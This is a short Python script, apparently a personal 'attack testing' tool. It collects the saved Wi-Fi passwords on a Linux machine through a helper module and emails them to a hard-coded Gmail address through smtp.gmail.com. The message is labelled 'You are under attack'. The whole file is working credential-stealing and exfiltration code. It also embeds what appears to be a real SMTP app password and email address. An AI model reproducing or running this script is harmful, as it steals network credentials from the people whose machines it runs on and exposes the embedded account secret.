import subprocess, smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import get_network_info as gni

context = ssl.create_default_context()
def send_mail(password, message, email_from = "akyeba@gmail.com", email_to = "akyeba@gmail.com"):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls(context=context)
        server.login(email_from, password)
        server.sendmail(email_from, email_to, message)
    except Exception as e:
        print(e)
    finally:
        server.quit()

command = "echo 'Hello'"
result = gni.get_linux_saved_wifi_passwords(verbose=0)
print(result)

email_from = "akyeba@gmail.com"
email_to = "akyeba@gmail.com"

message = MIMEMultipart("mixed")
message["Subject"] = "Attack Testing"
message["From"] = email_from
message["To"] = email_to

html = """\
        <html>
        <body>
            <p style="color:red;">You are under attack</p>
        </body>
        </html>
    """
payload1 = MIMEText(str(result), "plain")
payload2 = MIMEText(html, "html")
message.attach(payload1)
message.attach(payload2)
send_mail("btzxndupcrpuvsfg", message.as_string())
